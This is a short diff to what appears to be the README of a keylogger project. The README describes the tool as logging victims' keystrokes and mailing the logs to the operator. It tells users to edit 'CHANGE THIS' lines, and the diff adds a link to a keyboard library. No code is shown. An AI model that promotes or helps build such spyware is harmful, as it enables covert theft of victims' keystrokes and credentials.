@@ -6,3 +6,5 @@ This keylogger is logging victims keyboard and sends all logs to your mail addre
 Don't forget to change all "CHANGE THIS" lines.
 
 DISCLAIMER: FOR EDUCATIONAL ONLY !
+
+for keyboard module check https://github.com/boppreh/keyboard
